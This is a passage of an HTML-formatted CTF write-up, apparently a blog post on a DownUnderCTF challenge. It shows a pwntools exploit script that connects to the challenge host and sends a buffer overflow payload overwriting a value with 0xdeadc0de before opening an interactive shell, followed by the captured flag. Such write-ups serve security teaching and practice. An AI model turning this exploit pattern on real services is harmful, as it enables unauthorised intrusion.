class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
 ]]></content>
       <categories>
         <category>CTF</category>
